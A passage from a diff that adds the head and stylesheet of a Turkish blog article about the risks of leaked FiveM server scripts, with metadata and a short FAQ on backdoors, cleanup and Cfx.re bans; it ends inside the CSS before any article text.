@@ -1,0 +1,617 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>FiveM Leak Script Neden Tehlikeli? Backdoor, Cipher Panel ve Korunma Yolları</title>
+<meta name="description" content="Leak FiveM scriptler sunucuna backdoor (arka kapı) taşıyabilir ve Cfx.re yasağına yol açabilir. Nasıl çalıştığını, bulaşma belirtilerini, kendi kontrolünü nasıl yapacağını ve temizleme adımlarını anlattım.">
+<meta name="author" content="Yusuf Kaan Çelik">
+<meta name="robots" content="index, follow, max-image-preview:large">
+<link rel="canonical" href="https://yusufkaancelik.me/fivem-leak-script-tehlikeleri/">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="Yusuf Kaan Çelik">
+<meta property="og:title" content="FiveM Leak Script Neden Tehlikeli?">
+<meta property="og:description" content="Backdoor'lar nasıl çalışır, sunucunda olup olmadığını nasıl anlarsın, bulaştıysa ne yapmalısın.">
+<meta property="og:url" content="https://yusufkaancelik.me/fivem-leak-script-tehlikeleri/">
+<meta property="og:image" content="https://yusufkaancelik.me/og-fivem.jpg">
+<meta property="og:locale" content="tr_TR">
+<meta property="article:published_time" content="2026-11-19">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="FiveM Leak Script Neden Tehlikeli?">
+<meta name="twitter:image" content="https://yusufkaancelik.me/og-fivem.jpg">
+<link rel="icon" href="/favicon.ico" sizes="any">
+<link rel="icon" type="image/png" sizes="48x48" href="/favicon-48.png">
+<link rel="icon" type="image/png" sizes="96x96" href="/favicon-96.png">
+<link rel="icon" type="image/png" sizes="192x192" href="/favicon-192.png">
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+<meta name="theme-color" content="#000000">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Instrument+Serif:ital@0;1&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "Article", "@id": "https://yusufkaancelik.me/fivem-leak-script-tehlikeleri/#article", "headline": "FiveM Leak Script Neden Tehlikeli? Backdoor, Cipher Panel ve Korunma Yolları", "description": "Leak FiveM scriptler sunucuna backdoor (arka kapı) taşıyabilir ve Cfx.re yasağına yol açabilir. Nasıl çalıştığını, bulaşma belirtilerini, kendi kontrolünü nasıl yapacağını ve temizleme adımlarını anlattım.", "inLanguage": "tr", "datePublished": "2026-11-19", "dateModified": "2026-11-19", "author": {"@id": "https://yusufkaancelik.me/#person"}, "publisher": {"@id": "https://yusufkaancelik.me/#person"}, "mainEntityOfPage": "https://yusufkaancelik.me/fivem-leak-script-tehlikeleri/", "image": "https://yusufkaancelik.me/og-fivem.jpg", "isPartOf": {"@id": "https://yusufkaancelik.me/#website"}}, {"@type": "BreadcrumbList", "itemListElement": [{"@type": "ListItem", "position": 1, "name": "Ana sayfa", "item": "https://yusufkaancelik.me/"}, {"@type": "ListItem", "position": 2, "name": "FiveM script yaptırma", "item": "https://yusufkaancelik.me/fivem-script-yaptirma/"}, {"@type": "ListItem", "position": 3, "name": "Leak script tehlikeleri", "item": "https://yusufkaancelik.me/fivem-leak-script-tehlikeleri/"}]}, {"@type": "FAQPage", "mainEntity": [{"@type": "Question", "name": "Leak script kullanmak yasak mı?", "acceptedAnswer": {"@type": "Answer", "text": "Evet. Leak scriptler başkasının ücretli çalışmasının izinsiz kopyalarıdır ve FiveM kullanım şartlarına aykırıdır. Cfx.re, 2025'ten beri leak asset kullandığı tespit edilen sunuculara önce askıya alma, tekrarında kalıcı kapatma uyguluyor."}}, {"@type": "Question", "name": "Antivirüs FiveM backdoor'unu yakalar mı?", "acceptedAnswer": {"@type": "Answer", "text": "Çoğu zaman hayır. Backdoor, scriptin içine eklenmiş birkaç satır Lua ya da JavaScript kodudur; bilgisayar için sıradan bir metin dosyası gibi görünür. Bu yüzden kaynak kodunu okuyarak ya da şüpheli kalıpları arayarak bulmak gerekir."}}, {"@type": "Question", "name": "Leak scripti silmek yeterli mi?", "acceptedAnswer": {"@type": "Answer", "text": "Her zaman değil. Bazı backdoor'lar başka scriptlere ya da sunucu dosyalarına kendini kopyalar, yeni admin hesapları açar. Scripti sildikten sonra diğer kaynakları da taramak, tüm şifreleri değiştirmek ve ciddi bulaşmada sunucuyu sıfırdan kurmak gerekir."}}]}]}</script>
+<style>
+:root{
+  --bg:#000;
+  --bg-2:#0e0f0c;
+  --card:#16171a;
+  --card-2:#1d1e1b;
+  --line:rgba(255,255,255,.08);
+  --ink:#f5f5f7;
+  --ink-2:#a1a1a6;
+  --ink-3:#6e6e73;
+  --signal:#c6ff3d;
+  --rec:#ff4d2e;
+  --font:-apple-system, BlinkMacSystemFont, "SF Pro Display", "SF Pro Text", "Inter", "Helvetica Neue", Helvetica, Arial, sans-serif;
+  --serif:"Instrument Serif", Georgia, serif;
+  --mono:"JetBrains Mono", ui-monospace, monospace;
+  --wrap:min(980px, 100% - 2.5rem);
+  --wide:min(1180px, 100% - 2.5rem);
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;scroll-padding-top:48px}
+body{font-family:var(--font);font-size:17px;line-height:1.47;letter-spacing:-.022em;color:var(--ink);background:var(--bg);-webkit-font-smoothing:antialiased;overflow-x:hidden}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+::selection{background:var(--signal);color:#000}
+:focus-visible{outline:2px solid var(--signal);outline-offset:2px}
+em{font-family:var(--serif);font-style:italic;font-weight:400;color:var(--signal);letter-spacing:-.01em}
+body::after{content:"";position:fixed;inset:0;pointer-events:none;z-index:100;opacity:.05;
+  background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='160' height='160'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='.85' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E")}
+
+/* ---------- nav ---------- */
+.nav{position:sticky;top:0;z-index:50;height:48px;background:rgba(10,10,10,.72);backdrop-filter:saturate(180%) blur(20px);-webkit-backdrop-filter:saturate(180%) blur(20px);border-bottom:1px solid var(--line)}
+.nav-inner{width:var(--wrap);height:100%;margin:0 auto;display:grid;grid-template-columns:1fr auto 1fr;align-items:center}
+.logo{font-size:17px;font-weight:700;letter-spacing:-.02em;justify-self:start}
+.logo span{color:var(--signal)}
+.links{display:flex;gap:clamp(1rem,3vw,2.2rem);font-size:12px;letter-spacing:-.01em}
+.links a{color:var(--ink-2);transition:color .2s;padding:.9rem 0}
+.links a:hover{color:var(--signal)}
+.lang{justify-self:end;display:flex;gap:2px;background:rgba(255,255,255,.08);border-radius:980px;padding:2px}
+.lang button{font-family:var(--mono);font-size:11px;font-weight:600;background:none;border:0;color:var(--ink-2);padding:.25rem .65rem;border-radius:980px;cursor:pointer;min-height:24px}
+.lang button[aria-pressed="true"]{background:var(--signal);color:#000}
+.svc-more{display:inline-block;margin-top:1rem;font-family:var(--mono);font-size:12px;color:var(--signal)}
+.svc-more:hover{text-decoration:underline}
+.nav-r{justify-self:end;display:flex;align-items:center;gap:.6rem}
+.lang a{font-family:var(--mono);font-size:11px;font-weight:600;color:var(--ink-2);padding:.25rem .65rem;border-radius:980px;min-height:24px;display:inline-flex;align-items:center}
+.lang a[aria-current="page"]{background:var(--signal);color:#000}
+.lang a:not([aria-current="page"]):hover{color:var(--signal)}
+@media (max-width:767px){
+  .nav{height:auto}
+  .nav-inner{grid-template-columns:1fr auto;padding-top:.6rem}
+  .links{grid-column:1 / -1;grid-row:2;justify-content:center;gap:1.1rem;overflow-x:auto}
+  .links a{padding:.7rem 0}
+}
+
+/* ---------- shared ---------- */
+section{padding:clamp(5rem,11vw,8.5rem) 0;position:relative}
+.s-a{background:var(--bg)}
+.s-b{background:var(--bg-2)}
+.head{width:var(--wrap);margin:0 auto clamp(2.5rem,6vw,4rem);text-align:center}
+.eyebrow{font-family:var(--mono);font-size:13px;letter-spacing:.06em;text-transform:uppercase;color:var(--signal);margin-bottom:1rem}
+.head h2{font-size:clamp(2.25rem,1.4rem + 3.4vw,3.75rem);font-weight:600;line-height:1.07;letter-spacing:-.025em}
+.head p:not(.eyebrow){max-width:40rem;margin:1.1rem auto 0;font-size:clamp(17px,1.5vw,21px);line-height:1.4;color:var(--ink-2)}
+
+.pill{display:inline-flex;align-items:center;gap:.35rem;min-height:44px;padding:0 1.4rem;border-radius:980px;font-size:16px;font-weight:500;transition:background .2s,color .2s,border-color .2s,transform .2s}
+.pill.fill{background:var(--signal);color:#000}
+.pill.fill:hover{background:#d4ff66;transform:translateY(-1px)}
+.pill.line{border:1px solid rgba(255,255,255,.22);color:var(--ink)}
+.pill.line:hover{border-color:var(--signal);color:var(--signal)}
+.ctas{display:flex;flex-wrap:wrap;gap:.9rem;justify-content:center}
+
+/* ---------- hero ---------- */
+.hero{text-align:center;min-height:calc(100svh - 48px - 44px);display:grid;place-items:center;padding:6rem 1.25rem;background:radial-gradient(ellipse 60% 50% at 50% 40%,rgba(198,255,61,.09),transparent 70%),var(--bg)}
+.hero .eyebrow{display:inline-flex;align-items:center;gap:.6rem;color:var(--ink-2);margin-bottom:1.4rem}
+.dot{width:.5rem;height:.5rem;border-radius:50%;background:var(--signal);box-shadow:0 0 0 0 rgba(198,255,61,.6);animation:pulse 2s infinite}
+@keyframes pulse{70%{box-shadow:0 0 0 .5rem rgba(198,255,61,0)}100%{box-shadow:0 0 0 0 rgba(198,255,61,0)}}
+.hero h1{font-size:clamp(3.2rem,1rem + 9vw,7.5rem);font-weight:600;line-height:.98;letter-spacing:-.04em}
+.hero h1 em{font-size:1.08em;display:inline-block;padding-right:.05em}
+.hero p.sub{max-width:36rem;margin:1.6rem auto 2.4rem;font-size:clamp(19px,1.9vw,23px);line-height:1.38;color:var(--ink-2)}
+.hero p.sub strong{color:var(--ink);font-weight:600}
+.hero{position:relative;overflow:hidden;isolation:isolate}
+.hero-bg{position:absolute;inset:0;z-index:0;overflow:hidden;pointer-events:none;
+  -webkit-mask-image:radial-gradient(ellipse 42% 36% at 50% 50%,rgba(0,0,0,.4),#000 80%);mask-image:radial-gradient(ellipse 42% 36% at 50% 50%,rgba(0,0,0,.4),#000 80%)}
+.code-rain{position:absolute;left:50%;top:50%;width:0;height:0;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:1.15rem;transform:rotate(-30deg);opacity:.09}
+.code-rain .row{flex:none;white-space:nowrap;font-family:var(--mono);font-size:13px;letter-spacing:.01em;color:#8a8a8f;width:max-content;animation:slide var(--d,80s) linear infinite;will-change:transform}
+.code-rain .row:nth-child(3n){font-size:15px;color:#a1a1a6}
+.code-rain .row:nth-child(4n+1){font-size:11px;opacity:.7}
+.code-rain .k{color:var(--signal)}
+.code-rain .s{color:#d6d6d9}
+.code-rain .c{color:#5a5a5f}
+@keyframes slide{from{transform:translate3d(-25%,0,0)}to{transform:translate3d(25%,0,0)}}
+.hero > div{position:relative;z-index:1;opacity:0;transform:translateY(16px);animation:up 1s cubic-bezier(.2,.7,.2,1) .1s forwards}
+@keyframes up{to{opacity:1;transform:none}}
+
+/* ---------- ticker ---------- */
+.ticker{overflow:hidden;white-space:nowrap;background:var(--signal);color:#000;height:44px;display:flex;align-items:center}
+.ticker-track{display:inline-flex;gap:2.5rem;animation:scroll 34s linear infinite;font-family:var(--mono);font-weight:600;text-transform:uppercase;font-size:13px;letter-spacing:.04em}
+.ticker-track span::after{content:"✦";margin-left:2.5rem}
+@keyframes scroll{to{transform:translateX(-50%)}}
+
+/* ---------- about ---------- */
+.about-wrap{width:var(--wide);margin:0 auto;display:grid;grid-template-columns:1fr;gap:clamp(2.5rem,5vw,4.5rem);align-items:start}
+@media (min-width:900px){.about-wrap{grid-template-columns:minmax(260px,360px) 1fr}}
+.about-side{display:flex;flex-direction:column;align-items:center;gap:1.4rem}
+@media (min-width:900px){.about-side{position:sticky;top:88px}}
+.then-now{position:relative;width:min(300px,70vw);margin-bottom:5.5rem}
+.polaroid{position:absolute;right:-22%;bottom:-34%;width:58%;background:#f3f1ea;padding:7px 7px 0;border-radius:3px;transform:rotate(6deg);box-shadow:0 18px 40px rgba(0,0,0,.55);transition:transform .4s cubic-bezier(.2,.7,.2,1)}
+.polaroid:hover{transform:rotate(1deg) scale(1.06)}
+.polaroid img{width:100%;height:auto;aspect-ratio:4/5;object-fit:cover;display:block;border-radius:1px}
+.polaroid figcaption{font-family:var(--serif);font-style:italic;font-size:15px;color:#2a2a2a;text-align:center;padding:.45rem 0 .55rem;letter-spacing:0}
+@media (max-width:899px){.polaroid{right:-8%;width:52%}.polaroid figcaption{font-size:12px}}
+.about{overflow-x:clip}
+.about-photo{width:100%;aspect-ratio:1;border-radius:50%;padding:5px;background:conic-gradient(from 210deg,var(--signal),rgba(198,255,61,.08) 40%,var(--signal) 70%,rgba(198,255,61,.08));box-shadow:0 0 80px rgba(198,255,61,.12)}
+.about-photo img{width:100%;height:100%;border-radius:50%;object-fit:cover;border:4px solid var(--bg);background:var(--card)}
+.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:.6rem;width:100%;max-width:360px}
+.stat{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:1rem .6rem;text-align:center}
+.stat b{display:block;font-size:28px;font-weight:600;letter-spacing:-.02em;line-height:1}
+.stat span{display:block;margin-top:.4rem;font-family:var(--mono);font-size:10px;letter-spacing:.06em;text-transform:uppercase;color:var(--ink-2)}
+.about-main .eyebrow{text-align:left}
+.about-main h2{font-size:clamp(2rem,1.3rem + 2.8vw,3.25rem);font-weight:600;line-height:1.08;letter-spacing:-.025em;margin-bottom:1.4rem}
+.about-text{font-size:clamp(17px,1.4vw,19px);line-height:1.6;color:var(--ink-2);max-width:40rem}
+.about-text + .about-text{margin-top:1rem}
+.timeline{list-style:none;margin-top:2.6rem;border-left:1px solid var(--line);padding-left:1.6rem;display:flex;flex-direction:column;gap:1.5rem;max-width:40rem}
+.timeline li{position:relative}
+.timeline li::before{content:"";position:absolute;left:calc(-1.6rem - 5px);top:.35rem;width:9px;height:9px;border-radius:50%;background:var(--bg);border:2px solid var(--signal)}
+.timeline li:last-child::before{background:var(--signal);box-shadow:0 0 0 4px rgba(198,255,61,.15)}
+.timeline .when{font-family:var(--mono);font-size:12px;letter-spacing:.06em;text-transform:uppercase;color:var(--signal)}
+.timeline h4{font-size:18px;font-weight:600;letter-spacing:-.01em;margin:.2rem 0 .15rem}
+.timeline p{font-size:15px;color:var(--ink-2);line-height:1.5}
+
+.moments-label{margin-top:3rem;margin-bottom:1rem}
+.moments{display:grid;grid-template-columns:repeat(3,1fr);gap:.8rem;max-width:44rem}
+@media (max-width:600px){.moments{grid-template-columns:1fr 1fr}.moments figure:first-child{grid-column:1 / -1}}
+.moments figure{margin:0}
+.moments button{display:block;width:100%;aspect-ratio:4/5;padding:0;border:1px solid var(--line);border-radius:12px;overflow:hidden;cursor:zoom-in;background:var(--card)}
+@media (max-width:600px){.moments figure:first-child button{aspect-ratio:4/3}}
+.moments img{width:100%;height:100%;object-fit:cover;filter:saturate(.9);transition:transform .6s cubic-bezier(.2,.7,.2,1),filter .4s}
+.moments button:hover img{transform:scale(1.05);filter:saturate(1.05)}
+.moments figcaption{margin-top:.55rem;font-family:var(--serif);font-style:italic;font-size:15px;line-height:1.3;color:var(--ink-2)}
+
+/* ---------- cards ---------- */
+.cards{width:var(--wide);margin:0 auto;display:grid;grid-template-columns:1fr;gap:1.1rem}
+@media (min-width:740px){.cards{grid-template-columns:repeat(2,1fr)}}
+@media (min-width:1068px){.cards{grid-template-columns:repeat(3,1fr)}}
+.card{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:1.9rem 1.8rem;display:flex;flex-direction:column;gap:.7rem;min-height:15rem;transition:transform .35s cubic-bezier(.2,.7,.2,1),border-color .35s,background .35s}
+.card:hover{transform:translateY(-4px);border-color:rgba(198,255,61,.35);background:var(--card-2)}
+.card.has-img{padding:0;overflow:hidden}
+.card.has-img .card-body{padding:1.4rem 1.8rem 1.9rem;display:flex;flex-direction:column;gap:.7rem;flex:1}
+.card-body{display:contents}
+.card.has-img .card-body{display:flex}
+.shot{position:relative;display:block;width:100%;aspect-ratio:16/9;border:0;padding:0;cursor:zoom-in;background:var(--bg);overflow:hidden;border-bottom:1px solid var(--line)}
+.shot img{width:100%;height:100%;object-fit:cover;transition:transform .7s cubic-bezier(.2,.7,.2,1)}
+.card:hover .shot img{transform:scale(1.035)}
+.shot .count{position:absolute;right:.7rem;bottom:.7rem;font-family:var(--mono);font-size:11px;padding:.25rem .6rem;border-radius:980px;background:rgba(0,0,0,.65);color:var(--signal);border:1px solid var(--line)}
+.cards.feat{grid-template-columns:1fr}
+@media (min-width:740px){.cards.feat{grid-template-columns:repeat(2,1fr)}.cards.feat .card:first-child{grid-column:1 / -1}}
+@media (min-width:1068px){
+  .cards.feat .card:first-child{display:grid;grid-template-columns:1.5fr 1fr}
+  .cards.feat .card:first-child .shot{height:100%;aspect-ratio:16/9;border-bottom:0;border-right:1px solid var(--line)}
+  .cards.feat .card:first-child .card-body{justify-content:center;padding:2.4rem}
+  .cards.feat .card:first-child h3{font-size:32px}
+}
+.cards.compact{margin-top:1.1rem}
+@media (min-width:1068px){.cards.compact{grid-template-columns:repeat(4,1fr)}}
+.cards.compact .card{min-height:13rem}
+.lb{position:fixed;inset:0;z-index:200;background:rgba(0,0,0,.9);backdrop-filter:blur(8px);display:none;place-items:center;padding:2rem 4rem;cursor:zoom-out}
+.lb.open{display:grid}
+.lb img{max-width:min(1500px,100%);max-height:86vh;border-radius:12px;box-shadow:0 20px 80px rgba(0,0,0,.6)}
+.lb-nav{display:none;position:fixed;top:50%;transform:translateY(-50%);width:48px;height:48px;border-radius:50%;border:1px solid var(--line);background:rgba(20,20,20,.8);color:var(--ink);font-size:28px;line-height:1;cursor:pointer}
+.lb-nav:hover{border-color:var(--signal);color:var(--signal)}
+.lb.multi .lb-nav{display:grid;place-items:center}
+.lb-nav.prev{left:1rem}.lb-nav.next{right:1rem}
+.lb-count{position:fixed;bottom:1.2rem;left:50%;transform:translateX(-50%);font-family:var(--mono);font-size:12px;color:var(--signal)}
+.card .num{font-family:var(--mono);font-size:12px;color:var(--signal);letter-spacing:.04em}
+.card h3{font-size:clamp(21px,1.8vw,24px);font-weight:600;line-height:1.17;letter-spacing:-.015em}
+.card p{font-size:15px;line-height:1.5;color:var(--ink-2)}
+.tags{display:flex;flex-wrap:wrap;gap:.35rem;margin-top:auto;padding-top:.6rem}
+.tag{font-family:var(--mono);font-size:11px;color:var(--ink-2);border:1px solid var(--line);padding:.22rem .6rem;border-radius:980px}
+.card .go{font-family:var(--mono);color:var(--signal);font-size:13px}
+
+.all{width:var(--wrap);margin:3.5rem auto 0;text-align:center}
+.all p{font-family:var(--mono);font-size:12px;text-transform:uppercase;letter-spacing:.06em;color:var(--ink-3);margin-bottom:1rem}
+.chips{display:flex;flex-wrap:wrap;gap:.45rem;justify-content:center}
+.chips span{font-family:var(--mono);font-size:12px;padding:.4rem .85rem;border-radius:980px;border:1px solid var(--line);color:var(--ink-2);transition:border-color .2s,color .2s}
+.chips span:hover{border-color:var(--signal);color:var(--signal)}
+
+.note{width:var(--wrap);margin:2.25rem auto 0;text-align:center;font-size:15px;color:var(--ink-3)}
+.note a{color:var(--signal)}
+.note a:hover{text-decoration:underline}
+
+/* ---------- nft ---------- */
+.nft-grid{width:var(--wide);margin:0 auto;display:grid;grid-template-columns:repeat(2,1fr);gap:clamp(.6rem,1.4vw,1.1rem)}
+@media (min-width:740px){.nft-grid{grid-template-columns:repeat(3,1fr)}}
+@media (min-width:1068px){.nft-grid{grid-template-columns:repeat(4,1fr)}}
+.nft{position:relative;aspect-ratio:1;border-radius:14px;overflow:hidden;background:var(--card);border:1px solid var(--line)}
+.nft img,.nft .ph{width:100%;height:100%;object-fit:cover;transition:transform .6s cubic-bezier(.2,.7,.2,1)}
+.nft:hover img,.nft:hover .ph{transform:scale(1.04)}
+.ph{display:grid;place-items:center;font-family:var(--serif);font-style:italic;font-size:clamp(2.4rem,6vw,4rem);color:#000}
+.nft figcaption{position:absolute;left:0;right:0;bottom:0;display:flex;justify-content:space-between;padding:.9rem 1rem;font-family:var(--mono);font-size:11px;text-transform:uppercase;letter-spacing:.04em;color:#f5f5f7;background:linear-gradient(transparent,rgba(0,0,0,.75))}
+.nft-links{margin-top:3rem}
+
+.coll{width:var(--wide);margin:0 auto}
+.coll + .coll{margin-top:clamp(4rem,9vw,6.5rem)}
+.coll-head{display:flex;flex-wrap:wrap;align-items:center;justify-content:space-between;gap:1.2rem;margin-bottom:1.6rem}
+.coll-id{display:flex;align-items:center;gap:1rem}
+.coll-id img{width:56px;height:56px;border-radius:50%;object-fit:cover;border:2px solid var(--signal)}
+.coll-id h3{font-size:clamp(24px,2.4vw,32px);font-weight:600;letter-spacing:-.02em;line-height:1.1}
+.coll-id .chain{font-family:var(--mono);font-size:11px;letter-spacing:.06em;text-transform:uppercase;color:var(--signal)}
+.coll-id p{font-size:14px;color:var(--ink-2);margin-top:.25rem;max-width:34rem}
+.coll-banner{width:100%;aspect-ratio:16/6;object-fit:cover;border-radius:14px;border:1px solid var(--line);margin-bottom:1.1rem}
+.coll .nft-grid{width:100%}
+@media (min-width:1068px){.nft-grid.six{grid-template-columns:repeat(3,1fr)}}
+.nft-grid.seven{grid-template-columns:repeat(2,1fr)}
+@media (min-width:740px){.nft-grid.seven{grid-template-columns:repeat(4,1fr)}}
+@media (min-width:1068px){.nft-grid.seven{grid-template-columns:repeat(7,1fr)}}
+.nft-grid.seven .nft figcaption{justify-content:center}
+
+/* ---------- ai ---------- */
+.people{width:var(--wide);margin:0 auto;display:grid;grid-template-columns:1fr;gap:1.1rem}
+@media (min-width:740px){.people{grid-template-columns:repeat(3,1fr)}}
+.person{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:2.4rem 1.5rem 2rem;text-align:center;display:flex;flex-direction:column;align-items:center;gap:.4rem;transition:transform .35s cubic-bezier(.2,.7,.2,1),border-color .35s}
+a.person:hover{transform:translateY(-4px);border-color:rgba(198,255,61,.35)}
+.person{padding:2rem 1.2rem 1.2rem}
+.avatar{width:96px;height:96px;border-radius:50%;object-fit:cover;margin-bottom:.9rem;border:2px solid var(--signal);padding:3px;background:var(--bg)}
+.person .handle{font-family:var(--mono);font-size:12px;color:var(--signal);letter-spacing:.02em}
+.person p.bio{min-height:3em;margin:.2rem 0 .4rem;line-height:1.45}
+.socials{display:flex;gap:.5rem;justify-content:center;margin-bottom:1.1rem}
+.socials a{font-family:var(--mono);font-size:11px;letter-spacing:.04em;text-transform:uppercase;padding:.4rem .8rem;border-radius:980px;border:1px solid var(--line);color:var(--ink-2);transition:border-color .2s,color .2s;min-height:32px;display:inline-flex;align-items:center}
+.socials a:hover{border-color:var(--signal);color:var(--signal)}
+.posts{display:grid;grid-template-columns:repeat(3,1fr);gap:.4rem;width:100%;margin-top:auto}
+.posts a{position:relative;aspect-ratio:9/16;border-radius:8px;overflow:hidden;background:var(--bg)}
+.posts img{width:100%;height:100%;object-fit:cover;transition:transform .5s cubic-bezier(.2,.7,.2,1),opacity .3s;opacity:.92}
+.posts a:hover img{transform:scale(1.06);opacity:1}
+.posts a::after{content:"▶";position:absolute;right:.4rem;bottom:.35rem;font-size:10px;color:#fff;text-shadow:0 1px 4px rgba(0,0,0,.6)}
+.person h3{font-size:21px;font-weight:600;line-height:1.19}
+.person p{font-size:15px;color:var(--ink-2)}
+.person .more{font-family:var(--mono);font-size:12px;color:var(--signal);margin-top:.6rem}
+.ai-intro{width:var(--wrap);margin:3rem auto 0;text-align:center;font-size:15px;color:var(--ink-3)}
+
+/* ---------- kick ---------- */
+.kick{text-align:center}
+.screen{width:var(--wrap);margin:0 auto 1.2rem;aspect-ratio:16/7;border-radius:14px;border:1px solid var(--line);position:relative;overflow:hidden;display:grid;place-items:center;
+  background:repeating-linear-gradient(0deg,rgba(255,255,255,.025) 0 2px,transparent 2px 4px),radial-gradient(ellipse at 50% 30%,#1d2a0e 0%,var(--bg-2) 70%)}
+.live{position:absolute;top:1rem;left:1rem;display:flex;gap:.5rem;align-items:center;font-family:var(--mono);font-size:12px;background:rgba(0,0,0,.6);border:1px solid var(--line);padding:.3rem .7rem;border-radius:980px}
+.live .dot{background:var(--rec);animation:none}
+.screen-bg{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;opacity:.35;filter:saturate(.8)}
+.screen::after{content:"";position:absolute;inset:0;background:linear-gradient(180deg,rgba(0,0,0,.2),rgba(0,0,0,.65))}
+.screen > *:not(.screen-bg){position:relative;z-index:1}
+.screen .live{position:absolute}
+.screen-id{display:flex;flex-direction:column;align-items:center;gap:1.1rem}
+.screen-id img{width:clamp(72px,9vw,108px);height:clamp(72px,9vw,108px);border-radius:50%;object-fit:cover;border:3px solid var(--signal)}
+.vod{width:var(--wrap);margin:0 auto 2.4rem;display:grid;grid-template-columns:1fr;gap:1.2rem;align-items:center;text-align:left;background:var(--card);border:1px solid var(--line);border-radius:14px;padding:1rem;transition:border-color .3s,transform .3s}
+.vod:hover{border-color:rgba(198,255,61,.35);transform:translateY(-3px)}
+@media (min-width:740px){.vod{grid-template-columns:320px 1fr}}
+.vod-thumb{position:relative;aspect-ratio:16/9;border-radius:10px;overflow:hidden}
+.vod-thumb img{width:100%;height:100%;object-fit:cover}
+.play{position:absolute;inset:0;margin:auto;width:52px;height:52px;border-radius:50%;display:grid;place-items:center;background:var(--signal);color:#000;font-size:18px}
+.vod-text{display:flex;flex-direction:column;gap:.45rem;padding:.2rem .4rem}
+.vod-text .eyebrow{margin:0}
+.vod-text strong{font-size:clamp(19px,1.8vw,24px);font-weight:600;line-height:1.25;letter-spacing:-.01em}
+.vod-text .go{font-family:var(--mono);font-size:13px;color:var(--signal)}
+.screen .handle{font-size:clamp(2rem,1rem + 4.6vw,4.5rem);font-weight:600;letter-spacing:-.03em;line-height:1.05;padding:0 1rem}
+.screen .handle span{display:inline-block}
+.screen .handle span:first-child{color:var(--ink-3)}
+@media (max-width:480px){.screen{aspect-ratio:1/1}.screen .handle{font-size:clamp(1.8rem,9vw,2.4rem)}}
+
+/* ---------- contact ---------- */
+.contact{text-align:center}
+.contact .ctas{width:var(--wrap);margin:0 auto}
+.contact .head h2{font-size:clamp(2.4rem,1rem + 4.5vw,4.5rem);line-height:1.02}
+
+.services{width:var(--wrap);margin:0 auto;display:grid;grid-template-columns:1fr;gap:1.1rem}
+@media (min-width:740px){.services{grid-template-columns:1fr 1fr}}
+.svc{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:2rem 1.9rem;text-align:left;transition:border-color .35s,transform .35s cubic-bezier(.2,.7,.2,1)}
+.svc:hover{border-color:rgba(198,255,61,.35);transform:translateY(-3px)}
+.svc .num{font-family:var(--mono);font-size:12px;color:var(--signal);letter-spacing:.04em}
+.svc h3{font-size:clamp(22px,2vw,26px);font-weight:600;letter-spacing:-.015em;margin:.45rem 0 .6rem}
+.svc > p{font-size:15px;color:var(--ink-2);line-height:1.5}
+.svc ul{list-style:none;margin-top:1.1rem;display:flex;flex-direction:column;gap:.55rem}
+.svc li{position:relative;padding-left:1.4rem;font-size:15px;line-height:1.45}
+.svc li::before{content:"";position:absolute;left:0;top:.45rem;width:7px;height:7px;border-radius:50%;background:var(--signal)}
+.process{list-style:none;width:var(--wrap);margin:2.6rem auto 0;display:grid;grid-template-columns:1fr 1fr;gap:1rem;counter-reset:st}
+@media (min-width:900px){.process{grid-template-columns:repeat(4,1fr)}}
+.process li{text-align:left;border-top:1px solid var(--line);padding-top:1rem;counter-increment:st}
+.process li::before{content:"0" counter(st);display:block;font-family:var(--mono);font-size:12px;color:var(--signal);margin-bottom:.35rem}
+.process b{display:block;font-size:17px;font-weight:600}
+.process span{display:block;font-size:14px;color:var(--ink-2);margin-top:.25rem;line-height:1.45}
+.contact-box{width:var(--wrap);margin:3.5rem auto 0;display:grid;grid-template-columns:1fr;gap:1.1rem;text-align:left}
+@media (min-width:900px){.contact-box{grid-template-columns:1.7fr 1fr}}
+.cform{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:clamp(1.3rem,3vw,2rem);display:flex;flex-direction:column;gap:1rem}
+.row2{display:grid;grid-template-columns:1fr;gap:1rem}
+@media (min-width:600px){.row2{grid-template-columns:1fr 1fr}}
+.cform label{display:flex;flex-direction:column;gap:.4rem}
+.cform label > span{font-family:var(--mono);font-size:11px;letter-spacing:.06em;text-transform:uppercase;color:var(--ink-2)}
+.cform input,.cform select,.cform textarea{font:inherit;font-size:16px;letter-spacing:-.01em;color:var(--ink);background:var(--bg);border:1px solid rgba(255,255,255,.12);border-radius:10px;padding:.8rem .9rem;min-height:46px;outline:none;transition:border-color .2s,box-shadow .2s;width:100%}
+.cform textarea{resize:vertical;min-height:130px}
+.cform select{appearance:none;background-image:linear-gradient(45deg,transparent 50%,var(--ink-2) 50%),linear-gradient(135deg,var(--ink-2) 50%,transparent 50%);background-position:calc(100% - 18px) 50%,calc(100% - 13px) 50%;background-size:5px 5px;background-repeat:no-repeat;padding-right:2.4rem}
+.cform input:focus,.cform select:focus,.cform textarea:focus{border-color:var(--signal);box-shadow:0 0 0 3px rgba(198,255,61,.15)}
+.cform .bad{border-color:var(--rec)!important}
+.hp{position:absolute;left:-9999px;width:1px;height:1px;opacity:0}
+.form-foot{display:flex;flex-wrap:wrap;align-items:center;gap:1rem}
